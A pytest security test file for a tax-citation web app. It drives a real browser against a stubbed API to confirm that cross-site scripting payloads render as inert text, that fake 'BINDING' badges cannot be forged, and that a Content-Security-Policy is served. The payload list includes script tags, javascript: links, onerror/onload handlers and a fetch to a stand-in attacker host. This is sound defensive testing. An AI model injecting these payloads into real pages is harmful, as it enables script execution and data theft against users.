"""G5, the render path (ADR-13): nothing from a source, a document or an answer can execute or forge a UI element.

The page runs in a real browser (Playwright, Chromium) against a stubbed API: every route is answered from fixtures
carrying the golden rows' markup payloads (G-A02's <img onerror>, G-A05's javascript: link and fake BINDING badge)
and more. The page is served *without* the app's Content-Security-Policy, so these tests prove textContent alone
holds; the CSP is a second wall, checked on the real app separately. Free: no model, no database.
"""

import json
import os
import re
from pathlib import Path

import pytest
STATIC = Path(__file__).parent.parent / "src" / "taxcite" / "static"
ORIGIN = "http://taxcite.test"
TRIP = "window.__pwned=1"
PAYLOADS = [
    f'<img src=x onerror="{TRIP};fetch(\'https://attacker.example/i\')">',  # G-A02
    f"<script>{TRIP}</script>",
    f"[✔ BINDING — Verified by IRS](javascript:{TRIP})",  # G-A05
    f'<svg onload="{TRIP}"></svg>',
    f'<a href="javascript:{TRIP}">click</a>',
    f'<iframe src="javascript:{TRIP}"></iframe>',
]
EVIL = " ".join(PAYLOADS)
PUBLIC = "26 U.S.C. § 280A(c)(1)"
DOCUMENT = f"intake {PAYLOADS[0]}.pdf, p. 1"
OPINION = "T.C. Memo. 2020-1, at *3"
ANSWER = {
    "text": f"Tax year: 2025\n\nShort answer: No [{PUBLIC}].\n{EVIL} [{DOCUMENT}].\nAUTHORITY: statute ✔ BINDING [{OPINION}].",
    "citations": [PUBLIC, DOCUMENT, OPINION, f"{PAYLOADS[1]} [no authority]"],
    "derived_citations": [],
    "authorities": {PUBLIC: {"label": "Statute"}, DOCUMENT: {"label": "Client document"},
                    OPINION: {"label": "Tax Court memorandum opinion"}},
    "treatments": {"T.C. Memo. 2020-1": {"status": "reversed", "by": PAYLOADS[3]}},
    "hidden_sentences": 1, "cost_usd": 0.0071, "refused": False,
}
STAGES = [("decomposing", {}), (f"retrieving{PAYLOADS[1]}", {"subqueries": [{"query": EVIL}]}), ("answer", ANSWER)]
DOCUMENTS = {"documents": [{"id": "d1", "name": f"w2 {PAYLOADS[0]}.pdf", "kind": "pdf", "pages": 2,
                            "failed_pages": [{"page": 2, "status": EVIL}], "created_at": "2026-11-07"}]}
ALLOWED = {"HTML", "HEAD", "META", "TITLE", "STYLE", "SCRIPT", "BODY", "MAIN", "H1", "H2", "P", "SECTION", "LABEL",
           "INPUT", "TEXTAREA", "BUTTON", "FORM", "OL", "UL", "LI", "SPAN", "SMALL", "DIV"}


def sse(stages) -> str:
    return "".join(f"event: {name}\ndata: {json.dumps(data)}\n\n" for name, data in stages)


@pytest.fixture(scope="module")
def browser():
    sync_api = pytest.importorskip("playwright.sync_api")
    with sync_api.sync_playwright() as p:
        try:
            b = p.chromium.launch()
        except Exception as e:  # no browser downloaded: fine locally, never in CI
            if os.environ.get("CI"):
                raise
            pytest.skip(f"Chromium not installed (uv run playwright install chromium): {e}")
        yield b
        b.close()


@pytest.fixture
def page(browser):
    """The page with every route stubbed; records outbound requests, dialogs and console errors."""
    page = browser.new_page()
    seen = {"requests": [], "dialogs": [], "errors": []}
    page.on("request", lambda r: seen["requests"].append(r.url))
    page.on("dialog", lambda d: (seen["dialogs"].append(d.message), d.dismiss()))
    page.on("pageerror", lambda e: seen["errors"].append(str(e)))
    files = {"/": ("index.html", "text/html"), "/app.js": ("app.js", "text/javascript")}

    def handle(route):
        path = route.request.url.removeprefix(ORIGIN).split("?")[0]
        if path in files:
            name, kind = files[path]
            return route.fulfill(body=(STATIC / name).read_text(), content_type=kind)
        if path == "/queries" and route.request.method == "POST":
            return route.fulfill(status=202, json={"id": "j1", "events": "/queries/j1/events"})
        if path == "/queries/j1/events":
            return route.fulfill(body=sse(STAGES), content_type="text/event-stream")
        if path == "/documents":
            return route.fulfill(json=DOCUMENTS)
        return route.abort()  # anything else, including any outside host, never leaves the browser

    page.route("**/*", handle)
    page.goto(f"{ORIGIN}/")
    page.fill("#key", "test-key")
    yield page, seen
    page.close()


def render_everything(page):
    page.fill("#question", EVIL)
    page.click("#ask button[type=submit]")
    page.wait_for_selector("#answer h2")
    page.click("#refresh")
    page.wait_for_selector("#documents li")


def test_no_payload_executes_or_leaves_the_page(page):
    page, seen = page
    render_everything(page)
    page.wait_for_timeout(300)  # an onerror or onload would have fired by now
    assert page.evaluate("window.__pwned") is None
    assert seen["dialogs"] == [] and seen["errors"] == []
    assert all(url.startswith(ORIGIN) for url in seen["requests"]), seen["requests"]


def test_the_dom_holds_only_allowed_elements_and_no_handlers_or_links(page):
    page, _ = page
    render_everything(page)
    tags = set(page.evaluate("[...document.querySelectorAll('*')].map(e => e.tagName)"))
    assert tags <= ALLOWED, tags - ALLOWED
    assert page.evaluate("[...document.querySelectorAll('*')].flatMap(e => [...e.attributes])"
                         ".filter(a => a.name.startsWith('on') || /javascript:/i.test(a.value)).length") == 0
    assert page.evaluate("document.querySelectorAll('script').length") == 1  # the page's own app.js, nothing else


def test_payloads_show_as_inert_text(page):
    page, _ = page
    render_everything(page)
    shown = page.inner_text("#answer") + page.inner_text("#documents") + page.inner_text("#stages")
    for payload in PAYLOADS:
        assert payload in shown, payload  # visible, character for character: escaped, not stripped or parsed


def test_badges_come_only_from_structured_fields(page):
    page, _ = page
    render_everything(page)
    assert page.eval_on_selector_all(".badge", "es => es.map(e => e.textContent)") == [
        "Statute", "Client document", "Tax Court memorandum opinion"]  # the uncited-authority citation gets none
    assert page.eval_on_selector_all(".treatment", "es => es.map(e => e.textContent)") == [
        f"reversed by {PAYLOADS[3]}"]
    assert "BINDING" not in " ".join(page.eval_on_selector_all(".badge, .treatment", "es => es.map(e => e.textContent)"))


def test_the_page_never_parses_html_from_strings():
    """ADR-13 by construction: none of the APIs that turn a string into markup appear in the page's code."""
    code = (STATIC / "app.js").read_text() + (STATIC / "index.html").read_text()
    for api_name in ("innerHTML", "outerHTML", "insertAdjacentHTML", "document.write", "DOMParser", "createContextualFragment",
                     "eval(", "new Function", "setAttribute(\"href", ".href"):
        assert api_name not in code, api_name
    assert not re.search(r"<a\b|<img\b|<iframe\b", (STATIC / "index.html").read_text())


def test_the_app_serves_the_page_behind_a_content_security_policy():
    from fastapi.testclient import TestClient

    from taxcite import api

    client = TestClient(api.app)
    for path in ("/", "/app.js"):
        r = client.get(path)
        assert r.status_code == 200, path
        csp = r.headers["content-security-policy"]
        assert "script-src 'self'" in csp and "connect-src 'self'" in csp and "object-src 'none'" in csp
    assert client.get("/health").status_code in (200, 503)  # API routes still answer first
    assert client.get("/documents").status_code == 401
